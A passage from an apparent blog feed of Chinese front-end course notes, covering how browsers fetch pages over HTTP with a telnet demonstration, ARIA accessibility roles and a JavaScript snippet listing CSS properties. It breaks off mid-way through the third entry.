        <content type="html"><![CDATA[<p><img src="/Blog/2019/01/30/relearn_FE/26%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%841/index/img.png" alt="开局一张图，内容全靠编"></p><p>实际上，对浏览器的实现者来说，他们做的事情，就是把一个 URL 变成一个屏幕上显示的网页。</p><p>这个过程是这样的：</p><ol><li>浏览器首先使用 HTTP 协议或者 HTTPS 协议，向服务端请求页面；</li><li>把请求回来的 HTML 代码经过解析，构建成 DOM 树；</li><li>计算 DOM 树上的 CSS 属性；</li><li>最后根据 CSS 属性对元素逐个进行渲染，得到内存中的位图；</li><li>一个可选的步骤是对位图进行合成，这会极大地增加后续绘制的速度；</li><li>合成之后，再绘制到界面上。</li></ol><p>我们在开始详细介绍之前，要建立一个感性认识。我们从 HTTP 请求回来开始，这个过程并非一般想象中的一步做完再做下一步，而是一条流水线。</p><p>从 HTTP 请求回来，就产生了流式的数据，后续的 DOM 树构建、CSS 计算、渲染、合成、绘制，都是尽可能地<strong>流式处理</strong>前一步的产出：<strong>即不需要等到上一步骤完全结束，就开始处理上一步的输出</strong>，这样我们在浏览网页时，才会看到逐步出现的页面。</p><p>首先我们来介绍下网络通讯的部分。</p><h2 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h2><p>浏览器首先要做的事就是根据 URL 把数据取回来，取回数据使用的是 HTTP 协议，实际上这个过程之前还有 DNS 查询，不过这里就不详细展开了。</p><p>我先来了解下 HTTP 的标准。</p><p>HTTP 标准由 IETF 组织制定，跟它相关的标准主要有两份：</p><ul><li>HTTP1.1 <a href="https://tools.ietf.org/html/rfc2616">https://tools.ietf.org/html/rfc2616</a></li><li>HTTP1.1 <a href="https://tools.ietf.org/html/rfc7234">https://tools.ietf.org/html/rfc7234</a></li></ul><p>HTTP 协议是基于 TCP 协议出现的，对 TCP 协议来说，TCP 协议是一条双向的通讯通道，HTTP 在 TCP 的基础上，规定了 Request-Response 的模式。这个模式决定了通讯必定是由浏览器端首先发起的。</p><p>大部分情况下，浏览器的实现者只需要用一个 TCP 库，甚至一个现成的 HTTP 库就可以搞定浏览器的网络通讯部分。HTTP 是纯粹的文本协议，它是规定了使用 TCP 协议来传输文本格式的一个应用层协议。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>我们用一个 telnet 来试验一下（这个客户端是一个纯粹的 TCP 连接工具）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet <span class="selector-tag">time</span><span class="selector-class">.geekbang</span><span class="selector-class">.org</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>这个时候，TCP 连接已经建立，我们输入以下字符作为请求：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/ HTTP/</span><span class="number">1.1</span> <span class="regexp">//</span> 在请求部分，第一行被称作 request line，它分为三个部分，HTTP Method，也就是请求的“方法”，请求的路径和请求的协议和版本。</span><br><span class="line">Host: time.geekbang.org <span class="regexp">/ 紧随在 request line 或者 response line 之后，是请求头 /</span> 响应头，这些头由若干行组成，每行是用冒号分隔的名称和值。</span><br></pre></td></tr></table></figure><p>按下两次回车，我们收到了服务端的回复：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently // 在响应部分，第一行被称作 response line，它也分为三个部分，协议和版本、状态码和状态文本。</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 25 Jan 2019 13:28:12 GMT // 紧随在 request line 或者 response line 之后，是请求头 / 响应头，这些头由若干行组成，每行是用冒号分隔的名称和值。</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>182</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>https://time.geekbang.org/</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span><span class="punctuation">: </span>max-age=15768000 // 在头之后，以一个空行（两个换行符）为分隔，是请求体 / 响应体，请求体可能包含文件或者表单数据，响应体则是 HTML 代码。</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;white&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>openresty<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这就是一次完整的 HTTP 请求的过程了，我们可以看到，在 TCP 通道中传输的，完全是文本。</p><h2 id="HTTP-协议格式"><a href="#HTTP-协议格式" class="headerlink" title="HTTP 协议格式"></a>HTTP 协议格式</h2><p>根据上面的分析，我们可以知道 HTTP 协议，大概可以划分成如下部分。</p><p><img src="/Blog/2019/01/30/relearn_FE/26%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%841/index/img_1.png"></p><p>我们简单看一下，在这些部分中，path 是请求的路径完全由服务端来定义，没有很多的特别内容；而 version 几乎都是固定字符串；response body 是我们最熟悉的 HTML，我在后面会有专门的课程介绍，这里也就不多讲了。</p><h2 id="HTTP-Method（方法）"><a href="#HTTP-Method（方法）" class="headerlink" title="HTTP Method（方法）"></a>HTTP Method（方法）</h2><p>我们首先来介绍一下 request line 里面的方法部分。这里的方法跟我们编程中的方法意义类似，表示我们此次 HTTP 请求希望执行的操作类型。方法有以下几种定义：</p><ul><li>GET</li><li>POST</li><li>HEAD</li><li>PUT</li><li>DELETE</li><li>CONNECT</li><li>OPTIONS</li><li>TRACE</li></ul><h2 id="HTTP-Status-code（状态码）和-Status-text（状态文本）"><a href="#HTTP-Status-code（状态码）和-Status-text（状态文本）" class="headerlink" title="HTTP Status code（状态码）和 Status text（状态文本）"></a>HTTP Status code（状态码）和 Status text（状态文本）</h2><p>接下来我们看看 response line 的状态码和状态文本。常见的状态码有以下几种。</p><ul><li>1xx：临时回应，表示客户端请继续。</li><li>2xx：请求成功。<ul><li>200：请求成功。</li></ul></li><li>3xx: 表示请求的目标有变化，希望客户端进一步处理。<ul><li>301&amp;302：永久性与临时性跳转。</li><li>304：跟客户端缓存没有更新。</li></ul></li><li>4xx：客户端请求错误。<ul><li>403：无权限。</li><li>404：表示请求的页面不存在。</li><li>418：It’s a teapot. 这是一个彩蛋，来自 ietf 的一个愚人节玩笑。（超文本咖啡壶控制协议）</li></ul></li><li>5xx：服务端请求错误。<ul><li>500：服务端错误。</li><li>503：服务端暂时性错误，可以一会再试。</li></ul></li></ul><blockquote><p>对我们前端来说，1xx 系列的状态码是非常陌生的，原因是 1xx 的状态被浏览器 HTTP 库直接处理掉了，不会让上层应用知晓。</p></blockquote><h2 id="HTTP-Head-HTTP-头"><a href="#HTTP-Head-HTTP-头" class="headerlink" title="HTTP Head (HTTP 头)"></a>HTTP Head (HTTP 头)</h2><p>HTTP 头可以看作一个键值对。原则上，HTTP 头也是一种数据，我们可以自由定义 HTTP 头和值。不过在 HTTP 规范中，规定了一些特殊的 HTTP 头，我们现在就来了解一下它们。在 HTTP 标准中，有完整的请求 &#x2F; 响应头规定，这里我们挑几个重点的说一下：</p><p>我们先来看看 Request Header。</p><p><img src="/Blog/2019/01/30/relearn_FE/26%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%841/index/img_2.png"></p><p>接下来看一下 Response Header。</p><p><img src="/Blog/2019/01/30/relearn_FE/26%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%841/index/img_3.png"></p><p>这里仅仅列出了我认为比较常见的 HTTP 头，这些头是我认为前端工程师应该做到不需要查阅，看到就可以知道意思的 HTTP 头。完整的列表还是请你参考我给出的 rfc2616 标准。</p><h2 id="HTTP-Request-Body"><a href="#HTTP-Request-Body" class="headerlink" title="HTTP Request Body"></a>HTTP Request Body</h2><p>HTTP 请求的 body 主要用于提交表单场景。实际上，HTTP 请求的 body 是比较自由的，只要浏览器端发送的 body 服务端认可就可以了。一些常见的 body 格式是：</p><ul><li>application&#x2F;json</li><li>application&#x2F;x-www-form-urlencoded</li><li>multipart&#x2F;form-data</li><li>text&#x2F;xml</li></ul><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>在 HTTP 协议的基础上，HTTPS 和 HTTP2 规定了更复杂的内容，但是它基本保持了 HTTP 的设计思想，即：使用上的 Request-Response 模式。</p><p>我们首先来了解下 HTTPS。HTTPS 有两个作用，一是确定请求的目标服务端身份，二是保证传输的数据不会被网络中间节点窃听或者篡改。</p><p>HTTPS 的标准也是由 RFC 规定的，你可以查看它的详情链接：<a href="https://tools.ietf.org/html/rfc2818">https://tools.ietf.org/html/rfc2818</a></p><p>HTTPS 是使用加密通道来传输 HTTP 的内容。但是 HTTPS 首先与服务端建立一条 TLS 加密通道。TLS 构建于 TCP 协议之上，它实际上是对传输的内容做一次加密，所以从传输内容上看，HTTPS 跟 HTTP 没有任何区别。</p><h2 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP 2"></a>HTTP 2</h2><p>HTTP 2 是 HTTP 1.1 的升级版本，你可以查看它的详情链接：<a href="https://tools.ietf.org/html/rfc7540">https://tools.ietf.org/html/rfc7540</a></p><p>HTTP 2.0 最大的改进有两点，一是支持服务端推送，二是支持 TCP 连接复用。</p><p>服务端推送能够在客户端发送第一个请求到服务端时，提前把一部分内容推送给客户端，放入缓存当中，这可以避免客户端请求顺序带来的并行度不高，从而导致的性能问题。</p><p>TCP 连接复用，则使用同一个 TCP 连接来传输多个 HTTP 请求，避免了 TCP 连接建立时的三次握手开销，和初建 TCP 连接时传输窗口小的问题。</p><blockquote><p>Note: 其实很多优化涉及更下层的协议。IP 层的分包情况，和物理层的建连时间是需要被考虑的。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>25丨HTML&amp;CSS：ARIA-可访问性是只给盲人用的特性么？</title>
      <link href="/Blog/2019/01/30/relearn_FE/25%E4%B8%A8HTML&amp;CSS%EF%BC%9AARIA-%E5%8F%AF%E8%AE%BF%E9%97%AE%E6%80%A7%E6%98%AF%E5%8F%AA%E7%BB%99%E7%9B%B2%E4%BA%BA%E7%94%A8%E7%9A%84%E7%89%B9%E6%80%A7%E4%B9%88%EF%BC%9F/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/25%E4%B8%A8HTML&amp;CSS%EF%BC%9AARIA-%E5%8F%AF%E8%AE%BF%E9%97%AE%E6%80%A7%E6%98%AF%E5%8F%AA%E7%BB%99%E7%9B%B2%E4%BA%BA%E7%94%A8%E7%9A%84%E7%89%B9%E6%80%A7%E4%B9%88%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我们都知道，HTML 已经是一个完整的语义系统。在前面的课程中，我们围绕着 HTML 本身做了讲解，但是在实际应用中，我们还会用到一些它的扩展。今天我们要讲的 ARIA 就是其中重要的一部分。</p></blockquote><p>ARIA 全称为 Accessible Rich Internet Applications，它表现为一组属性，是用于可访问性的一份标准。关于可访问性，它被提到最多的，就是它可以为视觉障碍用户服务，但是，这是一个误解。</p><p>实际上，可访问性其实是一个相当大的课题，它的定义包含了各种设备访问、各种环境、各种人群访问的友好性。不单单是永久性的残障人士需要用到可访问性，健康的人也可能在特定时刻处于需要可访问性的环境。</p><p>所以我们的课程，特意把 ARIA 加入还有一个原因：ARIA 的角色对于我们 UI 系统的设计有重要的参考意义。</p><h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p>我们先整体来看看，ARIA 给 HTML 元素添加的一个核心属性就是 role，我们来看一个例子：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;span role<span class="operator">=</span><span class="string">&quot;checkbox&quot;</span> aria-checked<span class="operator">=</span><span class="string">&quot;false&quot;</span> tabindex<span class="operator">=</span><span class="string">&quot;0&quot;</span> aria-labelledby<span class="operator">=</span><span class="string">&quot;chk1-label&quot;</span>&gt;</span><br><span class="line">&lt;/span&gt; &lt;label id<span class="operator">=</span><span class="string">&quot;chk1-label&quot;</span>&gt;Remember my preferences&lt;/label&gt;</span><br></pre></td></tr></table></figure><p>这里我们给一个 span 添加了 checkbox 角色，这样，表示我们这个 span 被用于 checkbox，这意味着，我们可能已经用 JS 代码绑定了这个 span 的 click 事件，并且以 checkbox 的交互方式来处理用户操作。</p><p>同时，ARIA 系统还提供了一系列 ARIA 属性给 checkbox 这个 role，这意味着，<strong>我们可以通过 HTML 属性变化来理解这个 JavaScript 组件的状态</strong>，读屏软件等三方客户端，就可以理解我们的 UI 变化，这正是 ARIA 标准的意义。</p><p>role 的定义是一个树形的继承关系，我们先来理解一下它的整体结构：</p><p><img src="/Blog/2019/01/30/relearn_FE/25%E4%B8%A8HTML&CSS%EF%BC%9AARIA-%E5%8F%AF%E8%AE%BF%E9%97%AE%E6%80%A7%E6%98%AF%E5%8F%AA%E7%BB%99%E7%9B%B2%E4%BA%BA%E7%94%A8%E7%9A%84%E7%89%B9%E6%80%A7%E4%B9%88%EF%BC%9F/index/img.png"></p><p>其中，widget 表示一些可交互的组件，structure 表示文档中的结构，window 则代表窗体。</p><p>接下来，让我们分类了解一下重要的 ARIA 角色。</p><h2 id="Widget-角色"><a href="#Widget-角色" class="headerlink" title="Widget 角色"></a>Widget 角色</h2><p>我们刚刚已经讲过一个 widget role，就是 checkbox。</p><p>这一类角色跟我们桌面开发中的控件类似，它表示一个可交互的组件，它们有：</p><p><img src="/Blog/2019/01/30/relearn_FE/25%E4%B8%A8HTML&CSS%EF%BC%9AARIA-%E5%8F%AF%E8%AE%BF%E9%97%AE%E6%80%A7%E6%98%AF%E5%8F%AA%E7%BB%99%E7%9B%B2%E4%BA%BA%E7%94%A8%E7%9A%84%E7%89%B9%E6%80%A7%E4%B9%88%EF%BC%9F/index/img_1.png"></p><p>我们这里按照继承关系给出一份列表和简要说明：</p><p><img src="/Blog/2019/01/30/relearn_FE/25%E4%B8%A8HTML&CSS%EF%BC%9AARIA-%E5%8F%AF%E8%AE%BF%E9%97%AE%E6%80%A7%E6%98%AF%E5%8F%AA%E7%BB%99%E7%9B%B2%E4%BA%BA%E7%94%A8%E7%9A%84%E7%89%B9%E6%80%A7%E4%B9%88%EF%BC%9F/index/img_2.png"></p><p>ARIA role 允许多继承，这里有些角色我没有重复写。</p><p>注意，这些 role 可以出现在任何一个 HTML 元素之上，同时要注意，这些 ARIA 属性，不会真实地改变任何一个元素的行为，比如，我们刚才讲的 checkbox，即使我们给一个 span 添加了 Checkbox 角色，我们也需要用 JavaScript 编写相应的逻辑。</p><p>这些 widget 同时还会带来对应的 ARIA 属性，比如，我们的 Checkbox 角色，会带来两个属性：</p><ul><li>aria-checked 表示复选框是否已经被选中；</li><li>aria-labelledby 表示复选框对应的文字。</li></ul><p>而 Button 角色，则会带来另外两个属性：</p><ul><li>aria-pressed 按钮是否已经被按下；</li><li>aria-expanded 按钮控制的目标是否已经被展开。</li></ul><p>除了它们本身的属性之外，可交互组件还有继承来的属性，比如，switch 角色继承了 checkbox，因此，它也可以使用 aria-checked 属性。</p><p>在 WAI-ARIA 标准中，你可以找到所有的角色和对应的属性，我们这里就不一一列举了。</p><ul><li><a href="https://www.w3.org/TR/wai-aria/">https://www.w3.org/TR/wai-aria/</a></li></ul><p>很多这些 ARIA 属性都是需要在 JavaScript 中维护的。</p><p>如果我们要实现一份组件库，这些 widget role 和它们对应的 aria 属性是非常好的参考。</p><p>如果你是组件的实现者，也希望你在实现组件时把对应的 ARIA 属性自动维护好。</p><p>除了简单的 widget，还有一些比较复杂的角色，需要多个角色一起配合。我们来逐个了解一下。</p><p>Combobox 是一个带选项的输入框，我们常见的搜索引擎，一般都会提供这样的输入框，当输入时，它会提供若干提示选项。</p><p>Grid 是一个表格，它会分成行、列，行列又有行头和列头表示行、列的意义。</p><p>Tablist 是一个可切换的结构，一般被称为选项卡，它包含了 tab 头和 tabpanel，在 tab 容器中，可能包含各种组件。</p><p>Listbox 是一个可选中的列表，它内部具有角色为 Option 的选项。</p><p>Menu 是指菜单，菜单中可以加入嵌套的菜单项（Menuitem 角色），除了普通菜单项，还可以有 Menuitemcheckbox 带复选框的菜单栏和 Menuitemradio 带单选框的菜单栏。</p><p>Radiogroup 是一组互斥的单选框的容器，它的内部可以由若干个角色为 radio 的单选框。</p><p>Tree 是树形控件，它的内部含有 Treeitem 树形控件项，它还有一种升级形式是 Treegrid。</p><h2 id="structure-角色"><a href="#structure-角色" class="headerlink" title="structure 角色"></a>structure 角色</h2><p>结构角色其实跟 HTML5 中不少新标签作用重合了，这里建议优先使用 HTML5 标签。</p><p>这部分角色的作用类似于语义化标签，但是内容稍微有些不同，我们这里就不详细讲解了，仅仅给出一张图供你参考：</p><p><img src="/Blog/2019/01/30/relearn_FE/25%E4%B8%A8HTML&CSS%EF%BC%9AARIA-%E5%8F%AF%E8%AE%BF%E9%97%AE%E6%80%A7%E6%98%AF%E5%8F%AA%E7%BB%99%E7%9B%B2%E4%BA%BA%E7%94%A8%E7%9A%84%E7%89%B9%E6%80%A7%E4%B9%88%EF%BC%9F/index/img_3.png"></p><p>注：separator 在允许焦点时属于组件，在不允许焦点时属于文档结构。</p><p>这里我们需要特别提出 Landmark 角色这个概念，Landmark 角色直接翻译是地标，它是 ARIA 标准中总结的 Web 网页中最常见的 8 个结构，Landmark 角色实际上是 section 的子类，这些角色在生成页面摘要时有很大可能性需要被保留，它们是：</p><p><img src="/Blog/2019/01/30/relearn_FE/25%E4%B8%A8HTML&CSS%EF%BC%9AARIA-%E5%8F%AF%E8%AE%BF%E9%97%AE%E6%80%A7%E6%98%AF%E5%8F%AA%E7%BB%99%E7%9B%B2%E4%BA%BA%E7%94%A8%E7%9A%84%E7%89%B9%E6%80%A7%E4%B9%88%EF%BC%9F/index/img_4.png"></p><h2 id="window-角色"><a href="#window-角色" class="headerlink" title="window 角色"></a>window 角色</h2><p>在我们的网页中，有些元素表示“新窗口”，这时候，会用到 window 角色。window 系角色非常少，只有三个角色：</p><ul><li>window<ul><li>dialog<ul><li>alertdialog</li></ul></li></ul></li></ul><p>dialog 可能会产生“焦点陷阱”，也就是说，当这样的角色被激活时，焦点无法离开这个区域。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>24丨HTML&amp;CSS：用代码挖掘CSS属性</title>
      <link href="/Blog/2019/01/30/relearn_FE/24%E4%B8%A8HTML&amp;CSS%EF%BC%9A%E7%94%A8%E4%BB%A3%E7%A0%81%E6%8C%96%E6%8E%98CSS%E5%B1%9E%E6%80%A7/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/24%E4%B8%A8HTML&amp;CSS%EF%BC%9A%E7%94%A8%E4%BB%A3%E7%A0%81%E6%8C%96%E6%8E%98CSS%E5%B1%9E%E6%80%A7/index/</url>
      
        <content type="html"><![CDATA[<h2 id="浏览器中已经实现的属性"><a href="#浏览器中已经实现的属性" class="headerlink" title="浏览器中已经实现的属性"></a>浏览器中已经实现的属性</h2><p>首先我们来看看浏览器中实现了哪些属性。我们用一段代码来看一下。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.keys(document.body.style).<span class="built_in">filter</span>(<span class="function"><span class="params">e</span> =&gt;</span> !e.match(<span class="regexp">/^webkit/</span>))</span><br></pre></td></tr></table></figure><p>这段代码思路非常简单，就是枚举 document.body.style 上的所有属性，并且去掉 webkit 前缀的私有属性。</p><p>在我的 Chrome 中，得到了这样一组属性：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span 